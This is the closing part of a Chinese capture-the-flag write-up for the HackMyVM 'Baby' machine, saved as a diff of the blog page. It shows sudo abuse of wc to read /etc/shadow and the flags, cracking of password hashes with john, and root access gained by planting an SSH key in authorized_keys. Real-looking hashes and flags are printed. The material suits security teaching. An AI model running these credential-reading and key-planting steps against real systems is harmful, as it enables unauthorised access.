+</div><p>稳定 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaa@Baby:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> aaa on Baby:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User aaa may run the following commands on Baby:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/wc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现可以 sudo 执行 <code>wc</code> 命令，通过 <code>GTFOBins</code> 查找利用方式：https://gtfobins.org/gtfobins/wc/#file-read</p>
+<p><img src="/p/hmv-baby/assets/image-20261118153233043.png"
+	width="1489"
+	height="1057"
+	srcset="/p/hmv-baby/assets/image-20261118153233043_hu3383374824712097995.png 480w, /p/hmv-baby/assets/image-20261118153233043_hu3132101571097081652.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261118153233043"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="140"
+		data-flex-basis="338px"
+	
+></p>
+<p>可以任意文件读取，读取 <code>/etc/shadow</code> 文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaa@Baby:~$ sudo wc --files0-from /etc/shadow
+</span></span><span class="line"><span class="cl">wc: <span class="s1">&#39;root:$6$ePAhWE/j6QGfTWM3$Dn1vzbctoIv32MS89goS8Glk1h4W7ftIczomZ20dSGxrQq5ilIQyy2Y4wyQ4uw6F4O0IpgBfe0i8vE3/LQzLi/:20373:0:99999:7:::&#39;$&#39;\n&#39;&#39;daemon:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;bin:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;sys:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;sync:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;games:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;man:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;lp:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;mail:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;news:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;uucp:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;proxy:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;www-data:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;backup:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;list:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;irc:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;gnats:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;nobody:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;_apt:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;systemd-timesync:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;systemd-network:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;systemd-resolve:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;systemd-coredump:!!:20166::::::&#39;$&#39;\n&#39;&#39;messagebus:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;sshd:*:20166:0:99999:7:::&#39;$&#39;\n&#39;&#39;welcome:$6$Tcl1PdHt0sKyxCmX$0BRc1xwfh2ZcKWqdX.d9QZpZfoUojWKv76BIILLM6ZbQZ9w9e8hg23fl1yFQ5heujThjKtejlddXoTmj1R2230:20190:0:99999:7:::&#39;$&#39;\n&#39;&#39;aaa:$6$T0eyyrFo5fXjPVRB$w1WeM8bwmrlOoCI9Hl6ZK5OD5GufCEu.JTvq3uR7t.rKGdKZWlsbigec.RMLuXHxKMihPiIPYrBFwPrgPgpzR0:20373:0:99999:7:::&#39;$&#39;\n&#39;&#39;bbb:$6$rwAiZOTGKLpC1Yo6$yeTo5f5THCRygCQcLqICyJh8UC.7eNRxFI0.Dmp995qjU/SuvJhFBHe5hD8DUj.CW/TlX5nrtYgZZox5KuOxS1:20373:0:99999:7:::&#39;$&#39;\n&#39;&#39;ccc:$6$6.RbUGiv0omWNBhq$RuvFC1eOMv9L5.lX8iQtE3ACNhdUUAa/9bZnZnd01lntWURW2/Vzjl/xtQwoGOzyZ12vbBPV/IICzcTolwrwn1:20373:0:99999:7:::&#39;$&#39;\n&#39;</span>: No such file or directory
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>这里也可以取巧直接读 flag。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaa@Baby:~$ sudo wc --files0-from /root/root.txt
+</span></span><span class="line"><span class="cl">wc: <span class="s1">&#39;flag{root-7ed9295c3bdb1aaf2b427b64942b40fb}&#39;$&#39;\n&#39;</span>: No such file or directory
+</span></span><span class="line"><span class="cl">aaa@Baby:~$ sudo wc --files0-from /home/bbb/user.txt
+</span></span><span class="line"><span class="cl">wc: <span class="s1">&#39;flag{user-b8694d827c0f13f22ed3bc610c19ec15}&#39;$&#39;\n&#39;</span>: No such file or directory 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<p>提取其中的哈希，使用 <code>john</code> 爆破。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># hash</span>
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$ePAhWE</span>/j6QGfTWM3<span class="nv">$Dn1vzbctoIv32MS89goS8Glk1h4W7ftIczomZ20dSGxrQq5ilIQyy2Y4wyQ4uw6F4O0IpgBfe0i8vE3</span>/LQzLi/
+</span></span><span class="line"><span class="cl">bbb:<span class="nv">$6$rwAiZOTGKLpC1Yo6$yeTo5f5THCRygCQcLqICyJh8UC</span>.7eNRxFI0.Dmp995qjU/SuvJhFBHe5hD8DUj.CW/TlX5nrtYgZZox5KuOxS1
+</span></span><span class="line"><span class="cl">ccc:<span class="nv">$6$6</span>.RbUGiv0omWNBhq<span class="nv">$RuvFC1eOMv9L5</span>.lX8iQtE3ACNhdUUAa/9bZnZnd01lntWURW2/Vzjl/xtQwoGOzyZ12vbBPV/IICzcTolwrwn1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破命令：<code>john --wordlist=/usr/share/wordlists/rockyou.txt</code>。</p>
+<p>成功爆破出除 <code>root</code> 外其它用户的密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HMV/baby<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john --show <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">bbb:root
+</span></span><span class="line"><span class="cl">ccc:root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">2</span> password hashes cracked, <span class="m">1</span> left
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bbb">bbb
+</h3><p>切换到 <code>bbb</code>，却无权读 <code>user.txt</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bbb@Baby:~$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/bbb
+</span></span><span class="line"><span class="cl">bbb@Baby:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">24</span>
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> bbb  bbb  <span class="m">4096</span> Oct <span class="m">12</span>  <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> Oct <span class="m">12</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> bbb  bbb   <span class="m">220</span> Oct <span class="m">12</span>  <span class="m">2025</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> bbb  bbb  <span class="m">3526</span> Oct <span class="m">12</span>  <span class="m">2025</span> .bashrc
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> bbb  bbb   <span class="m">807</span> Oct <span class="m">12</span>  <span class="m">2025</span> .profile
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> root root   <span class="m">44</span> Oct <span class="m">12</span>  <span class="m">2025</span> user.txt
+</span></span><span class="line"><span class="cl">bbb@Baby:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">cat: user.txt: Permission denied
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以 <code>sudo</code> 执行 <code>ls</code>，查看一下 <code>/root</code> 的目录结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bbb@Baby:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bbb on Baby:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User bbb may run the following commands on Baby:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/ls
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">bbb@Baby:~$ sudo ls /root
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">bbb@Baby:~$ sudo ls -la /root
+</span></span><span class="line"><span class="cl">total <span class="m">48</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">6</span> root root <span class="m">4096</span> Oct <span class="m">12</span>  <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root root <span class="m">4096</span> Mar <span class="m">18</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">18</span>  <span class="m">2025</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> root root <span class="m">4096</span> Apr  <span class="m">4</span>  <span class="m">2025</span> .cache
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">4</span>  <span class="m">2025</span> .gnupg
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">18</span>  <span class="m">2025</span> .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">44</span> Oct <span class="m">12</span>  <span class="m">2025</span> root.txt
+</span></span><span class="line"><span class="cl">drw-------  <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">4</span>  <span class="m">2025</span> .ssh
+</span></span><span class="line"><span class="cl">-rw-rw-rw-  <span class="m">1</span> root root <span class="m">8805</span> Oct <span class="m">12</span>  <span class="m">2025</span> .viminfo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现存在 <code>.ssh</code> 目录，后续可以尝试写公钥到 <code>authorized_keys</code>。</p>
+<h3 id="ccc">ccc
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bbb@Baby:~$ su - ccc
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">ccc@Baby:~$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> ccc  ccc  <span class="m">4096</span> Oct <span class="m">12</span>  <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> Oct <span class="m">12</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> ccc  ccc   <span class="m">220</span> Oct <span class="m">12</span>  <span class="m">2025</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> ccc  ccc  <span class="m">3526</span> Oct <span class="m">12</span>  <span class="m">2025</span> .bashrc
+</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> ccc  ccc   <span class="m">807</span> Oct <span class="m">12</span>  <span class="m">2025</span> .profile
+</span></span><span class="line"><span class="cl">ccc@Baby:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> ccc on Baby:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User ccc may run the following commands on Baby:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /opt/ccc.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以 <code>sudo</code> 执行 <code>/opt/ccc.sh</code> 脚本，切换回 <code>aaa</code> 查看脚本内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaa@Baby:~$ sudo wc --files0-from /opt/ccc.sh
+</span></span><span class="line"><span class="cl">wc: <span class="s1">&#39;#!/bin/bash&#39;$&#39;\n\n&#39;&#39;cp /home/ccc/.ssh/id_rsa.pub /root/.ssh/authorized_keys&#39;$&#39;\n&#39;</span>: No such file or directory
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本功能：把 <code>/home/ccc/.ssh/id_rsa.pub</code> 复制到 <code>/root/.ssh/authorized_keys</code>。</p>
+<h2 id="提权">提权
+</h2><p>先生成公钥：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa -b <span class="m">4096</span> -f ~/.ssh/pwn_key -N <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">cat ~/.ssh/pwn_key.pub 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用攻击机的公钥覆盖 <code>id_rsa.pub</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ccc@Baby:~$ mkdir .ssh
+</span></span><span class="line"><span class="cl">ccc@Baby:~$ <span class="nb">echo</span> <span class="s2">&#34;ssh-rsa &lt;公钥&gt; root@kali&#34;</span> &gt; .ssh/id_rsa.pub
+</span></span><span class="line"><span class="cl">ccc@Baby:~$ sudo /opt/ccc.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用私钥即可 SSH 连接 root：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HMV/baby<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh -i ~/.ssh/pwn_key root@192.168.1.9                  
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;192.168.1.9 (192.168.1.9)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is: SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>192.168.1.9<span class="err">&#39;</span> <span class="o">(</span>ED25519<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span class="line"><span class="cl">** This session may be vulnerable to <span class="s2">&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span class="line"><span class="cl">** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span class="line"><span class="cl">Linux Baby 4.19.0-27-amd64 <span class="c1">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Sun Oct <span class="m">12</span> 03:42:24 <span class="m">2025</span> from 192.168.3.94
+</span></span><span class="line"><span class="cl">root@Baby:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@Baby:~# cat root.txt 
+</span></span><span class="line"><span class="cl">flag<span class="o">{</span>root-7ed9295c3bdb1aaf2b427b64942b40fb<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/mazesec-spindle/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MazeSec Spindle</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb-sherlocks-dfir%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-sherlocks-dfir%E7%B3%BB%E5%88%97/assets/image-20261109172652784.9d097f62fa823dd4d18a40bd7f05eaf9_hu209872944237851452.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB sherlocks DFIR系列"
+                        
+                        data-hash="md5-nQl/YvqCPdTRikC9fwXq&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB sherlocks DFIR系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/assets/image-20261104205444073.d9e4fd976e03998d17a7cc2012db183c_hu3527743922139951764.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB Starting Point 入门系列"
+                        
+                        data-hash="md5-2eT9l24DmY0Xp8wgEtsYPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Starting Point 入门系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+.article-content .highlight-wrap {
+  position: relative;
+  overflow: hidden;
+  border-radius: var(--card-border-radius);
+}
+.article-content .highlight-wrap .highlight {
+  margin:0;
+}
+ 
+.article-content .highlight-wrap.collapse {
+  max-height: 380px;
+}
+ 
+.article-content .highlight-wrap.collapse::after {
+  content: "";
